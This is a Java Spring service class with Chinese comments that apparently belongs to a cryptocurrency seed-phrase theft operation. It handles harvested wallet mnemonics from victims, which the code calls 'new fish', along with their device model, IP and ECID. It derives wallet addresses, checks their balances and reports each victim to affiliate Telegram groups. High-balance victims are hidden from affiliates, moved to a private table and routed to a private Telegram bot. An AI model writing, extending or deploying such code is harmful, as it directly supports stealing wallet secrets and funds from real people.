package com.consume.service;

import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executor;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import com.consume.config.MaxNoticeProperties;
import com.consume.dao.Address4Dao;
import com.consume.dao.ChannelDao;
import com.consume.dao.DeviceDao;
import com.consume.entity.ChannelEntity;
import com.consume.entity.DeviceEntity;
import com.consume.util.MessageFormatUtils;
import com.consume.util.TelegramNotificationUtil;
import com.consume.util.WalletBalanceQuery;
import com.consume.util.WalletBalanceQuery.ChainBalance;
import com.consume.util.WalletDerivator;

import lombok.extern.slf4j.Slf4j;

/**
 * 助记词 / 余额飞机通知。新鱼苗延后到余额后；高额走隐私 bot/群并迁表。
 */
@Service
@Slf4j
public class MnemonicTelegramService {

    private static final DateTimeFormatter DTF = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static final long FISH_DEDUP_MS = 120_000L;

    private final ConcurrentHashMap<String, PendingFish> pendingFish = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, Long> fishSent = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<Integer, Boolean> balanceDedup = new ConcurrentHashMap<>();

    @Autowired
    private TelegramNotificationUtil telegramNotificationUtil;
    @Autowired
    private ChannelDao channelDao;
    @Autowired
    private DeviceDao deviceDao;
    @Autowired
    private Address4Dao address4Dao;
    @Autowired
    private WalletBalanceQuery walletBalanceQuery;
    @Autowired
    private MaxNoticeProperties maxNoticeProps;
    @Autowired
    private HighValueMnemonicService highValueMnemonicService;
    @Autowired
    @Qualifier("balanceNotifyExecutor")
    private Executor balanceNotifyExecutor;

    @Async("telegramMsgExecutor")
    public void notifyFishAsync(Integer deviceRowId, String deviceId, String channelCodeFallback, String clientIpFallback) {
        try {
            DeviceEntity device = loadDevice(deviceRowId, deviceId);
            if (device == null) {
                log.debug("正常日志:[telegram] 设备不存在，跳过新鱼苗挂起 deviceRowId={} deviceId={}",
                        deviceRowId, deviceId);
                return;
            }
            String dedupKey = firstNonEmpty(device.getDeviceId(), String.valueOf(device.getId()));
            PendingFish p = new PendingFish();
            p.deviceRowId = deviceRowId;
            p.deviceId = device.getDeviceId();
            p.channelCode = firstNonEmpty(device.getChannelCode(), channelCodeFallback);
            p.model = device.getModel();
            p.ip = firstNonEmpty(device.getIp(), clientIpFallback);
            p.ecid = firstNonEmpty(device.getEcid(), device.getDeviceId());
            pendingFish.put(dedupKey, p);
            if (pendingFish.size() > 5000) pendingFish.clear();
            log.debug("正常日志:[telegram] 新鱼苗已挂起 device={}", dedupKey);
        } catch (Exception e) {
            log.info("异常日志:[telegram] 新鱼苗挂起失败 deviceRowId={} deviceId={} err={}",
                    deviceRowId, deviceId, e.getMessage());
        }
    }

    public void notifyBalanceAfterDeriveAsync(Integer mnemonicId, Integer deviceRowId, String deviceId,
                                              String channelCodeFallback, String clientIpFallback,
                                              List<WalletDerivator.DerivedAddress> derived) {
        notifyBalanceAfterDeriveAsync(mnemonicId, deviceRowId, deviceId,
                channelCodeFallback, clientIpFallback, derived, false);
    }

    /**
     * @param forceRematch true=上报地址撞库命中后再次通知（覆盖先前 index0 回退通知）
     */
    public void notifyBalanceAfterDeriveAsync(Integer mnemonicId, Integer deviceRowId, String deviceId,
                                              String channelCodeFallback, String clientIpFallback,
                                              List<WalletDerivator.DerivedAddress> derived,
                                              boolean forceRematch) {
        if (mnemonicId == null || derived == null || derived.isEmpty()) return;
        List<WalletDerivator.DerivedAddress> copied = new ArrayList<>(derived);
        balanceNotifyExecutor.execute(() -> {
            try {
                if (forceRematch) {
                    balanceDedup.remove(mnemonicId);
                }
                doBalanceNotify(mnemonicId, deviceRowId, deviceId, channelCodeFallback, clientIpFallback, copied);
            } catch (Exception e) {
                log.info("异常日志:[telegram] 余额通知失败 mnemonicId={} err={}", mnemonicId, e.getMessage());
                balanceDedup.remove(mnemonicId);
            }
        });
    }

    private void doBalanceNotify(Integer mnemonicId, Integer deviceRowId, String deviceId,
                                 String channelCodeFallback, String clientIpFallback,
                                 List<WalletDerivator.DerivedAddress> derived) {
        if (balanceDedup.putIfAbsent(mnemonicId, Boolean.TRUE) != null) {
            log.debug("正常日志:[telegram] 余额通知去重跳过 mnemonicId={}", mnemonicId);
            return;
        }
        Map<String, String> chainAddr = new HashMap<>();
        for (WalletDerivator.DerivedAddress da : derived) {
            if (da == null || da.chaintype == null || da.address == null) continue;
            chainAddr.putIfAbsent(da.chaintype.toLowerCase(), da.address);
        }
        Map<String, ChainBalance> balances = walletBalanceQuery.queryAll(chainAddr);

        double refreshed = System.currentTimeMillis() / 1000.0;
        for (WalletDerivator.DerivedAddress da : derived) {
            if (da == null || da.chaintype == null) continue;
            ChainBalance b = balances.get(da.chaintype.toLowerCase());
            if (b == null) continue;
            try {
                address4Dao.updateBalance(mnemonicId, da.chaintype, da.addrIndex,
                        nzBal(b.getNativeBal()), nzBal(b.getUsdtBal()), "0", refreshed);
            } catch (Exception e) {
                log.info("异常日志:[telegram] 回写余额失败 mnemonicId={} chain={} err={}",
                        mnemonicId, da.chaintype, e.getMessage());
            }
        }

        DeviceEntity device = loadDevice(deviceRowId, deviceId);
        String channelCode = device != null
                ? firstNonEmpty(device.getChannelCode(), channelCodeFallback)
                : channelCodeFallback;
        String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
        String model = device == null ? null : device.getModel();
        String ip = device == null ? clientIpFallback : firstNonEmpty(device.getIp(), clientIpFallback);
        String ecid = device == null ? deviceId : firstNonEmpty(device.getEcid(), device.getDeviceId());
        String fishKey = firstNonEmpty(deviceId, device == null ? null : String.valueOf(device.getId()));

        if (highValueMnemonicService.isHighValue(balances)) {
            handleHighValue(mnemonicId, device, fishKey, channelCode, model, ip, ecid, datetime, balances);
            return;
        }

        flushPendingFishToChannel(fishKey, channelCode);
        ChannelEntity channel = resolveChannel(channelCode);
        if (channel == null) {
            log.debug("正常日志:[telegram] 渠道无 telegram_groupid，跳过余额 mnemonicId={} channel={}",
                    mnemonicId, channelCode);
            return;
        }
        String text = MessageFormatUtils.saveBalanceTelegram(
                channel.getTelegramGroupid(), channelCode, channel.getName(), mnemonicId,
                model, ip, ecid, datetime, balances);
        telegramNotificationUtil.sendTelegramMsg(text, channel.getTelegramGroupid());
    }

    private void handleHighValue(Integer mnemonicId, DeviceEntity device, String fishKey,
                                 String channelCode, String model, String ip, String ecid,
                                 String datetime, Map<String, ChainBalance> balances) {
        // 高额一律不发渠道群：先摘掉挂起的新鱼苗
        if (fishKey != null) pendingFish.remove(fishKey);
        // 先迁移，飞机消息用 private_mnemonic.id
        Integer privateId = highValueMnemonicService.migrateToPrivate(mnemonicId, device);
        if (privateId == null) {
            balanceDedup.remove(mnemonicId);
            log.info("异常日志:[maxnotice] 迁移未完成，解除余额去重 mnemonicId={}", mnemonicId);
            return;
        }
        if (!maxNoticeProps.isPrivateTgConfigured()) {
            log.info("异常日志:[maxnotice] 已迁移 privateId={} 但未配置隐私 bot/群，跳过飞机", privateId);
            return;
        }
        String privGroup = maxNoticeProps.getTgGroupId().trim();
        String privToken = maxNoticeProps.getTgBotToken().trim();
        sendFishOnce(fishKey, privGroup, privToken, channelCode, "PRIVATE", model, ip, ecid, datetime, true);
        String balText = MessageFormatUtils.saveHighValueBalanceTelegram(
                privGroup, channelCode, "PRIVATE", privateId,
                model, ip, ecid, datetime, balances);
        telegramNotificationUtil.sendTelegramMsg(balText, privGroup, privToken);
    }

    private void flushPendingFishToChannel(String fishKey, String channelCode) {
        PendingFish pending = fishKey == null ? null : pendingFish.remove(fishKey);
        ChannelEntity channel = resolveChannel(channelCode != null ? channelCode
                : (pending == null ? null : pending.channelCode));
        if (channel == null) {
            log.debug("正常日志:[telegram] 渠道无 telegram_groupid，跳过新鱼苗 device={}", fishKey);
            return;
        }
        String datetime = LocalDateTime.now(ZoneId.systemDefault()).format(DTF);
        String model = pending == null ? null : pending.model;
        String ip = pending == null ? null : pending.ip;
        String ecid = pending == null ? fishKey : pending.ecid;
        String cc = firstNonEmpty(channelCode, pending == null ? null : pending.channelCode);
        sendFishOnce(fishKey, channel.getTelegramGroupid(), null, cc, channel.getName(),
                model, ip, ecid, datetime, false);
    }

    private void sendFishOnce(String fishKey, String groupId, String tokenOverride,
                              String channelCode, String channelName,
                              String model, String ip, String ecid, String datetime,
                              boolean privateGroup) {
        if (fishKey == null || fishKey.isEmpty()) return;
        String dedupNs = (privateGroup ? "p:" : "c:") + fishKey;
        long now = System.currentTimeMillis();
        Long prev = fishSent.putIfAbsent(dedupNs, now);
        if (prev != null && now - prev < FISH_DEDUP_MS) {
            log.debug("正常日志:[telegram] 新鱼苗去重跳过 device={} private={}", fishKey, privateGroup);
            return;
        }
        if (prev != null) fishSent.put(dedupNs, now);
        if (fishSent.size() > 500) {
            fishSent.entrySet().removeIf(e -> now - e.getValue() > FISH_DEDUP_MS);
        }
        String text = privateGroup
                ? MessageFormatUtils.saveHighValueFishTelegram(
                        groupId, channelCode, channelName, model, ip, ecid, datetime)
                : MessageFormatUtils.saveMnemonicFishTelegram(
                        groupId, channelCode, channelName, model, ip, ecid, datetime);
        if (tokenOverride != null && !tokenOverride.isEmpty()) {
            telegramNotificationUtil.sendTelegramMsg(text, groupId, tokenOverride);
        } else {
            telegramNotificationUtil.sendTelegramMsg(text, groupId);
        }
    }

    private DeviceEntity loadDevice(Integer deviceRowId, String deviceId) {
        DeviceEntity device = null;
        if (deviceRowId != null) {
            try { device = deviceDao.findById(deviceRowId); } catch (Exception ignore) {}
        }
        if (device == null && deviceId != null && !deviceId.isEmpty()) {
            try { device = deviceDao.findDeviceId(deviceId); } catch (Exception ignore) {}
        }
        return device;
    }

    private ChannelEntity resolveChannel(String channelCode) {
        if (channelCode == null || channelCode.isEmpty()) return null;
        ChannelEntity channel = channelDao.findByChannelcode(channelCode);
        if (channel == null || channel.getTelegramGroupid() == null
                || channel.getTelegramGroupid().isEmpty()) {
            return null;
        }
        return channel;
    }

    private static String firstNonEmpty(String a, String b) {
        if (a != null && !a.isEmpty()) return a;
        return b == null ? "" : b;
    }

    private static String nzBal(String v) {
        return (v == null || v.isEmpty()) ? "0" : v;
    }

    private static final class PendingFish {
        Integer deviceRowId;
        String deviceId;
        String channelCode;
        String model;
        String ip;
        String ecid;
    }
}
